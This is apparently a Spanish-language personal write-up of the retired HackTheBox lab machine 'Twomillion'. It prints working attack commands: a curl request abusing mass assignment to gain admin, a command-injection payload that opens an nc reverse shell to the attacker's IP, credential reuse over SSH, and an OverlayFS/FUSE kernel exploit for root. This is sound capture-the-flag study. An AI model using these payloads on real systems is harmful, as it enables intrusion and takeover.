---
title: "Twomillion HTB"
machine: "Twomillion"
platform: "HackTheBox"
os: "Linux"
difficulty: "Easy"
tags: ["RCE", "Privesc", "Web"]
retired: true
summary: "esta es mi segunda maquina de htb es una linux y el primer escaneo me revela disponibilidad en ssh y web"
draft: false
---
esta es mi segunda maquina de htb es una linux y el primer escaneo me revela disponibilidad en ssh y web 

![Pasted image 20260426113901.png](/img/twomillion/1.png)

hacemos un escaneo de version y scripts basicos :

![Pasted image 20260426114117.png](/img/twomillion/2.png)

escaneo que nos revela que efectivamente va a ser un reto web procedere a agregarlo al etc host y explorar el sitio web `echo "10.129.229.66  2million.htb" | sudo tee -a /etc/hosts` asi se ve la pagina principal

![Pasted image 20260426120140.png](/img/twomillion/3.png)

el unico directorio arparte disponible para el publico es el de login hay campos de texto donde se pueden probar alguna clase de injeccion de comandos pd:eso es solo una idea pero lo comprobaremos mas adelante :

![Pasted image 20260426120344.png](/img/twomillion/4.png)

otra cosa es que la pagina avisa cuando un usuario no existe lo que da lugar a enumeracion de usuarios:

![Pasted image 20260426120756.png](/img/twomillion/5.png)

lo siguiente que intente fue reconocimiento clasico empece con enumeracion de directorios y vhost y encontre algunas cosas interesantes `gobuster dir -u http://2million.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,json,bak,old,zip --exclude-length 162 -o gobuster_dirs.txt` y `gobuster dir -u http://2million.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,json,bak,old,zip --exclude-length 162 -o gobuster_dirs.txt`

no se detectaron vhost pero si directorios valiosos:

![Pasted image 20260426123718.png](/img/twomillion/6.png)

primero revise invite donde hay otro campo de texto interesante:

![Pasted image 20260426124020.png](/img/twomillion/7.png)

una vez con la info de los directorios lanzo ReconSpyder.py un scrawler de red que tambien me da arcvhivos muy interesantes `sudo python3 ReconSpider.py http://2million.htb`

```
  31 │         "http://2million.htb/css"
  32 │     ],
  33 │     "js_files": [
  34 │         "http://2million.htb/js/inviteapi.min.js",
  35 │         "http://2million.htb/js/htb-frontpage.min.js",
  36 │         "http://2million.htb/js/htb-frontend.min.js"
```

sigo descargando y revisando estos archivos `curl -s http://2million.htb/js/inviteapi.min.js -H "Host: 2million.htb" -o inviteapi.min.js`

bien siguiendo ese hilo la cadena fue esta

### Encontramos el "Manual de Instrucciones"

Al analizar los archivos del sitio, encontramos uno llamado `inviteapi.min.js`. Aunque estaba desordenado y oculto, logramos leer que el servidor tenía una **API** (una puerta trasera para que las aplicaciones hablen entre sí) que aceptaba órdenes específicas para el sistema de invitaciones.

### Pedimos pistas al servidor

Usamos un comando (`curl`) para enviarle una petición **POST** a una ruta secreta que descubrimos: `/api/v1/invite/how-to-generate`. El servidor nos respondió con un mensaje en formato **JSON** (un formato de texto organizado) que decía algo como: *"Para generar el código, haz una petición POST a /api/v1/invite/generate"*.

### El mensaje estaba "disfrazado"

Esa instrucción no venía en texto claro, sino cifrada en **ROT13**. Es un truco simple donde cada letra se cambia por la que está 13 lugares después en el abecedario (la 'A' se vuelve 'N', etc.). Lo desciframos y seguimos la orden.

### Generamos nuestro propio código

Hicimos lo que el servidor pidió: enviamos otra petición a la nueva ruta (`/generate`). El servidor, creyendo que éramos una parte autorizada del sistema, nos entregó un código: `UllaR1MtRTBNS00tNEFOVTktMzdWUDQ=`.

### Quitamos el envoltorio final Base64

Ese código estaba en **Base64**, que es una forma de empaquetar datos para que viajen por internet sin romperse. Al "desempaquetarlo" con el comando `base64 -d`, obtuvimos el código real: `RYZGS-E0MKM-4ANU9-37VP4`.

una vez teniendo el codigo estamos aqui

![Pasted image 20260426125839.png](/img/twomillion/8.png)

pd los datos lo puse yo y estamos adentro de la pag

![Pasted image 20260426130038.png](/img/twomillion/9.png)

lo primero que noto es el aviso> Important Announcement: We are currently performing database migrations. For this reason some of the website's features will be unavailable. We apologize for the inconvenience.

explorando la pagina una vez hay las secciones que funcionan al menos para el publico son access,dasboard, y change log adjunto captures :

![Pasted image 20260426131129.png](/img/twomillion/10.png)

![Pasted image 20260426131159.png](/img/twomillion/11.png)

investigando un poco se sabe esto

### Hallazgos Críticos en el Log

1. **Versión 1.0.0 - "Self Service VPN Keys Reissuing":** Se habilitó la capacidad de regenerar las llaves VPN desde la página de **Access**. Esto confirma que el servidor ejecuta scripts para generar archivos `.ovpn`.
2. **Versión 0.9.3 - "OVPN Cert Generation Failure":** Menciona un bug donde correos de más de 40 caracteres rompían la generación del certificado. Esto indica que el sistema usa datos del usuario (como el email o el username) para pasarlos a un comando de consola (probablemente `openssl`). **Si no filtran bien los caracteres especiales, aquí tenemos el Command Injection.**
3. **Versión 1.0.0 - "Security Bug: Information Disclosure":** Mencionan que dejaron directivas por defecto que muestran la versión del servidor y el OS. Esto explica por qué el escaneo de Nmap fue tan preciso con la versión de Ubuntu.
esta es la oportunidad perfecta para abrir Burp suite por primera vez XD descubri algo muy interesante 
4. **Endpoint:** `/api/v1/user/vpn/generate``` me quede un buen tiempo atascado intentando que el sevidor me diese una reverse shell pero no hubo manera asi que mapee toda la estructura api y consegui acceso siguiendo estos pasos ¡**BINGO**! Ese` {"is_admin":1}` explotando una vulnerabilidad de **Insecure Direct Object Reference (IDOR)** o asignación masiva en la API. El servidor confió en mi entrada y te otorgó permisos de administrador.

![Pasted image 20260426134056.png](/img/twomillion/12.png)

---

### Enumeración de la API

Tras obtener acceso como usuario, enumeramos los endpoints de la API en `http://2million.htb/api/v1`. Descubrimos rutas restringidas para administradores:

- `PUT /api/v1/admin/settings/update`: Permite actualizar parámetros de usuario.
- `POST /api/v1/admin/vpn/generate`: Genera configuraciones VPN (sospechoso de inyección de comandos).

### Privilege Escalation (API Exploitation)

Aunque nuestra cuenta se llamaba `admin`, no tenía privilegios reales. Explotamos el endpoint de actualización enviando un parámetro `is_admin` que el servidor no filtraba correctamente:

Bash

```
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
--cookie "PHPSESSID=1vu9638ka8bhecg4k2ij3k7f2k" \
--header "Content-Type: application/json" \
--data '{"email":"admin@gmail.com", "is_admin":1}'
```

**Resultado:** El servidor respondió con `{"is_admin":1}`, confirmando que nuestra sesión ahora tiene privilegios de administrador.

### Ejecución Remota de Comandos (RCE)

Con privilegios de admin, atacamos el generador de VPN. Basándonos en el *Change Log*, sabíamos que el campo `username` se pasaba a un comando de sistema (como `openssl`) sin sanitizar.

**Payload de Reverse Shell:** Usamos una estructura de `mkfifo` para crear un canal bidireccional y obtener una shell interactiva.

1. **Listener en Kali:** `nc -lvnp 8888`
2. **Explotación:**

Bash

```
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
--cookie "PHPSESSID=1vu9638ka8bhecg4k2ij3k7f2k" \
--header "Content-Type: application/json" \
--data '{"username":"admin; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.132 8888 >/tmp/f"}'
```

una vez dentro el primer archivo que revisamos ya tiene credenciales de usuarios

![Pasted image 20260426142931.png](/img/twomillion/13.png)

revisaremos si reutilizaron credenciales algo demasiado comun en los entornos tanto de CTF como en entornos de la vida real como el unico puerto abierto arparte del 80 es el 21 probaremos ssh y BINGO estamos dentro como admin 

![Pasted image 20260426143414.png](/img/twomillion/14.png)

XDXDXDXD el usuario admin no es root asi que tendremos que escalar privilegios XD uno pensaria que como se llama admin ya era root se nota que soy novato en esto

pues nada despues de mucha enumeracion descubrimos esto 

![Pasted image 20260426145138.png](/img/twomillion/15.png)

investigue como usar la vulnerabilidad y ejecutamos

### Preparación del Exploit

Se utilizó el exploit de `xkaneiki` que requiere la interacción de dos sistemas de archivos: **FUSE** (para el montaje de usuario) y **OverlayFS** (para la escalada).

**Compilación en el objetivo:**

Bash

```
cd /tmp/pwn
make all
```

### Ejecución en Dos Pasos (Doble Terminal)

Para que el exploit funcione, se requiere mantener el montaje de FUSE activo mientras se dispara la vulnerabilidad desde otra sesión.

Iniciamos el servidor FUSE vinculando el binario `gc` al sistema de archivos inferior de OverlayFS.

Bash

```
./fuse ./ovlcap/lower ./gc
```

> *Nota: Esta terminal debe permanecer abierta para mantener el montaje.*
> 

Iniciamos una nueva sesión SSH (`ssh admin@2million.htb`) y ejecutamos el disparador.

Bash

```
cd /tmp/pwn
./exp
```

### Obtención de Root

Tras el mensaje `[+] exploit success!`, el bit SUID se ha filtrado correctamente al binario de la capa superior. Ejecutamos para obtener la shell de root:

Bash

```
./gc
# whoami
# root
```

y **BINGO**! 

![Pasted image 20260426151050.png](/img/twomillion/16.png)

con esto **mi segunda maquina facil sin guia ha sido hakeada !!!**
